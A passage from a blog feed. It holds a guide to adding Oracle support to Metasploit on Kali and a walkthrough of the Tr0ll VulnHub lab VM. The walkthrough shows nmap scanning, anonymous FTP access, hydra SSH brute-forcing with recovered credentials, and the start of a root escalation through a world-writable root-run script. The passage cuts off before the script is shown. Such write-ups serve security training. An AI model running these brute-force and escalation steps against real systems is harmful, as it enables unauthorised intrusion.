    <updated>2014-08-17T15:46:49+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/17/kali-linux-oracle-support</id>
    <content type="html"><![CDATA[<p>Recently I have had to get Oracle support sorted in my Kali Linux install. I will try not to rant about the reasons why it doesn&rsquo;t just work out of the box and just get the steps written down quickly. Typically, when you try to use a module such as <code>oracle_login</code>, metasploit may error out with:</p>

<figure class='code'><figcaption><span>Metasploit Oracle Error</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>oracle_login<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Failed to load the OCI library: cannot load such file -- oci8
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> See http://www.metasploit.com/redmine/projects/framework/wiki/OracleUsage <span class="k">for </span>installation instructions
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>oracle_login<span class="o">)</span> &gt; run
</span></code></pre></td></tr></table></div></figure>


<p>The link provided seems a little out of date, so here is an updated guide.</p>

<!--more-->


<h2>getting started</h2>

<p>First, if you dont have an account at oracle.com, you will <em>unfortunately</em> need one here. If you don&rsquo;t want to create one, don’t worry, a temp email works as well as you luckily don’t have to confirm ownership of it before you can download.</p>

<h2>sorting oracle first</h2>

<p>Anyways. Create yourself a directory <code>/opt/oracle</code> and <code>cd</code> there. In a browser, navigate to the <a href="http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html">instant client downloads</a> url and choose your architecture. If you hate 32bit Kali, choose <a href="http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html">Linux x86</a>, and 64bit Kali choose <a href="http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html">Linux x86-64</a>.</p>

<p>Next, download the following packages and save them to <code>/opt/oracle</code>:</p>

<ul>
<li>instantclient-basic-linux-12.1.0.1.0.zip</li>
<li>instantclient-sqlplus-linux-12.1.0.1.0.zip</li>
<li>instantclient-sdk-linux-12.1.0.1.0.zip</li>
</ul>


<p>With those downloaded, extract the archives with the <code>unzip</code> command. This should leave you with a directory <code>/opt/oracle/instantclient_12_1/</code>. This is all the files needed to at least get the <code>sqlplus</code> client going. However, when we build the ruby stuff needed for Metasploit, we will need to hax a .so. Do this with:</p>

<figure class='code'><figcaption><span>so symlink</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle/instantclient_12_1# ln libclntsh.so.12.1 libclntsh.so
</span><span class='line'>
</span><span class='line'>root@kali:/opt/oracle/instantclient_12_1# ls -lh libclntsh.so
</span><span class='line'>lrwxrwxrwx 1 root root 17 Aug 17 15:37 libclntsh.so -&gt; libclntsh.so.12.1
</span></code></pre></td></tr></table></div></figure>


<p>The last step is to configure the environment so that your shell is&hellip; <em>oracle aware</em>. We do this by setting a few environment variables. I have chosen to just append the lines to the end of my <code>.bashrc</code> file</p>

<figure class='code'><figcaption><span>.bashrc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle/instantclient_12_1# tail ~/.bashrc
</span><span class='line'>
</span><span class='line'><span class="c"># ORACLE</span>
</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">SQLPATH</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">TNS_ADMIN</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">ORACLE_HOME</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span></code></pre></td></tr></table></div></figure>


<p>Done! Log out and back and check that these are present in the output of <code>env</code>.</p>

<h2>sorting out metasploit</h2>

<p>The last thing we need to do is setup the metasploit part. For this we need to download <a href="https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.1.7.zip">ruby-oci8</a>. In <code>/opt/oracle</code>, download it:</p>

<figure class='code'><figcaption><span>download ruby-oci8</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle# wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.1.7.zip
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>2014-08-17 16:11:31 <span class="o">(</span>42.8 KB/s<span class="o">)</span> - <span class="sb">`</span>ruby-oci8-2.1.7.zip<span class="err">&#39;</span> saved <span class="o">[</span>278270<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@kali:/opt/oracle# unzip ruby-oci8-2.1.7.zip
</span><span class='line'>Archive:  ruby-oci8-2.1.7.zip
</span><span class='line'>fb913e32d8a09bd46e5bf549bd8e554f0870d384
</span><span class='line'>   creating: ruby-oci8-ruby-oci8-2.1.7/
</span><span class='line'>  inflating: ruby-oci8-ruby-oci8-2.1.7/.gitignore
</span><span class='line'>  inflating: ruby-oci8-ruby-oci8-2.1.7/.yardopts
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>  inflating: ruby-oci8-ruby-oci8-2.1.7/test/test_rowid.rb
</span><span class='line'>root@kali:/opt/oracle#
</span></code></pre></td></tr></table></div></figure>


<p>Next, move to the extracted directory and install the <code>ruby-dev</code> package if you have not already done so:</p>

<figure class='code'><figcaption><span>ruby-dev</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle# <span class="nb">cd </span>ruby-oci8-ruby-oci8-2.1.7/
</span><span class='line'>
</span><span class='line'>root@kali:/opt/oracle/ruby-oci8-ruby-oci8-2.1.7# apt-get install ruby-dev
</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we will <code>make</code> &amp;&amp; <code>make install</code>. Logout and back in and test that the oracle tools in metasploit are functional :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[taming (actually just solving) the troll]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/15/taming-the-troll/"/>
    <updated>2014-08-15T07:12:03+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/15/taming-the-troll</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>

<!--more-->


<h2>nomad, promise</h2>

<p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>

<figure class='code'><figcaption><span>Tr0ll nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-
</span><span class='line'>
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>21/tcp open  ftp     syn-ack vsftpd 3.0.2
</span><span class='line'>22/tcp open  ssh     syn-ack <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>

<p><img src="https://i.imgur.com/SiNzlyi.png"></p>

<p>The <code>robots.txt</code> file revealed:</p>

<figure class='code'><figcaption><span>Tr0ll robots.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>User-agent:*
</span><span class='line'>Disallow: /secret
</span></code></pre></td></tr></table></div></figure>


<p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>

<p><img src="https://i.imgur.com/E2SezsL.png"></p>

<p>Right&hellip; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>

<h2>anonny-mouse ftp</h2>

<p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>

<figure class='code'><figcaption><span>Tr0ll ftp login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ftp 192.168.56.101
</span><span class='line'>Connected to 192.168.56.101.
</span><span class='line'>220 <span class="o">(</span>vsFTPd 3.0.2<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.101:root<span class="o">)</span>: anonymous
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>
</span><span class='line'>ftp&gt; ls
</span><span class='line'>500 Illegal PORT command.
</span><span class='line'>ftp: <span class="nb">bind</span>: Address already in use
</span><span class='line'>
</span><span class='line'>ftp&gt; passive
</span><span class='line'>Passive mode on.
</span><span class='line'>
</span><span class='line'>ftp&gt; ls
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,231,190<span class="o">)</span>
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
</span><span class='line'>226 Directory send OK.
</span><span class='line'>
</span><span class='line'>ftp&gt; get lol.pcap
</span><span class='line'><span class="nb">local</span>: lol.pcap remote: lol.pcap
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,189,113<span class="o">)</span>
</span><span class='line'>150 Opening BINARY mode data connection <span class="k">for </span>lol.pcap <span class="o">(</span>8068 bytes<span class="o">)</span>.
</span><span class='line'>226 Transfer complete.
</span><span class='line'>8068 bytes received in 0.00 secs <span class="o">(</span>21294.3 kB/s<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>ftp&gt; bye
</span><span class='line'>221 Goodbye.
</span></code></pre></td></tr></table></div></figure>


<p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>

<p><img src="https://i.imgur.com/vpgEP3o.png"></p>

<p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to <a href="http://192.168.56.101/sup3rs3cr3tdirlol/.">http://192.168.56.101/sup3rs3cr3tdirlol/.</a> In this path there was a binary  called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>

<figure class='code'><figcaption><span>Tr0ll roflmao file</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
</span><span class='line'>--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
</span><span class='line'>Connecting to 192.168.56.101:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 7296 <span class="o">(</span>7.1K<span class="o">)</span>
</span><span class='line'>Saving to: <span class="sb">`</span>roflmao<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[======&gt;] 7,296       --.-K/s   in 0s      </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-08-15 07:57:56 (826 MB/s) - `roflmao&#39;</span> saved <span class="o">[</span>7296/7296<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@kali:~/Desktop/Tr0ll# chmod +x roflmao
</span><span class='line'>root@kali:~/Desktop/Tr0ll# ./roflmao
</span><span class='line'>Find address 0x0856BF to proceed
</span></code></pre></td></tr></table></div></figure>


<p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href="https://twitter.com/barrebas">@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried <a href="http://192.168.56.101/0x0856BF/:">http://192.168.56.101/0x0856BF/:</a></p>

<p><img src="https://i.imgur.com/yXWgKij.png"></p>

<h2>nohydraplz</h2>

<p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>

<figure class='code'><figcaption><span>which_one_lol.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>maleus
</span><span class='line'>ps-aux
</span><span class='line'>felux
</span><span class='line'>Eagle11
</span><span class='line'>genphlux &lt; -- Definitely not this one
</span><span class='line'>usmc8892
</span><span class='line'>blawrg
</span><span class='line'>wytshadow
</span><span class='line'>vis1t0r
</span><span class='line'>overflow
</span></code></pre></td></tr></table></div></figure>


<p>List of passwords? Dunno. The folder <code>this_folder_contains_the_password</code> had a file <code>Pass.txt</code> with contents:</p>

<figure class='code'><figcaption><span>Pass.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Good_job_:)
</span></code></pre></td></tr></table></div></figure>


<p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>

<figure class='code'><figcaption><span>Tr0ll hydra</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
</span><span class='line'>
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ssh on port 22
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;maleus&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 1 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;ps-aux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 2 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;felux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 3 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Eagle11&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 4 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;genphlux &lt; -- Definitely not this one&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 5 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;genphlux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 6 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> could not connect to target port 22
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> ssh protocol error
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Retrying connection <span class="k">for </span>child 0
</span><span class='line'><span class="o">[</span>RE-ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> could not connect to target port 22
</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> ssh protocol error
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Retrying connection <span class="k">for </span>child 0
</span><span class='line'><span class="o">[</span>RE-ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Err, the sudden errors only meant one thing&hellip; <code>fail2ban</code>.</p>

<figure class='code'><figcaption><span>Tr0ll ssh filtered</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22
</span><span class='line'>
</span><span class='line'>PORT   STATE    SERVICE REASON
</span><span class='line'>22/tcp filtered ssh     no-response
</span></code></pre></td></tr></table></div></figure>


<p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&hellip; :\&rdquo;</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>

<h2>first shell</h2>

<p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>

<p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&hellip;</p>

<p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>

<figure class='code'><figcaption><span>Tr0ll hydra success`</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -u -L list -p <span class="s2">&quot;Pass.txt&quot;</span> -t 1 -u 192.168.56.101 ssh
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
</span><span class='line'>
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> 1 task, 1 server, 13 login tries <span class="o">(</span>l:13/p:1<span class="o">)</span>, ~13 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ssh on port 22
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;maleus&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 1 of 13 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;ps-aux&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 2 of 13 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;felux&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 3 of 13 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.56.101   login: overflow   password: Pass.txt
</span></code></pre></td></tr></table></div></figure>


<p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>

<figure class='code'><figcaption><span>Tr0ll ssh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
</span><span class='line'>overflow@192.168.56.101<span class="err">&#39;</span>s password:
</span><span class='line'>Welcome to Ubuntu 14.04.1 LTS <span class="o">(</span>GNU/Linux 3.13.0-32-generic i686<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Could not chdir to home directory /home/overflow: No such file or directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>&hellip; and root</h2>

<p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>

<p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>

<p><em>suddenly</em></p>

<figure class='code'><figcaption><span>Tr0ll times up</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Broadcast Message from root@trol
</span><span class='line'>        <span class="o">(</span>somewhere<span class="o">)</span> at 16:05 ...
</span><span class='line'>
</span><span class='line'>TIMES UP LOL!
</span><span class='line'>
</span><span class='line'>Connection to 192.168.56.101 closed by remote host.
</span><span class='line'>Connection to 192.168.56.101 closed.
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>Urgh. Turns out, something is killing my ssh session every 5 minutes. <strong>Oh my word</strong>, was that annoying. I could handle everything the VM&rsquo;s offered, but this was probably the worst part of it.</p>

<p>Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the <em>thing</em> I should be finding has a more recent timestamp:</p>

<figure class='code'><figcaption><span>Tr0ll check </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overflow@troll:/<span class="nv">$ </span>find / -executable -type f 2&gt; /dev/null <span class="p">|</span> egrep -v <span class="s2">&quot;^/bin|^/var|^/etc|^/usr&quot;</span> <span class="p">|</span> xargs ls -lh <span class="p">|</span> grep Aug
</span><span class='line'>
</span><span class='line'>-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
</span><span class='line'>-rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
</span><span class='line'>-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
</span><span class='line'>-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
</span></code></pre></td></tr></table></div></figure>


<p>A few interesting results came from that, however, the one that held the golden nugget was <code>/lib/log/cleaner.py</code>. During my enumeration I noticed that <code>/tmp</code> got cleaned out at a really strange time as I was still trying to <code>less</code> a file in there, however, it just <em>disappeared</em>.</p>

<p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>

<figure class='code'><figcaption><span>cleaner.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
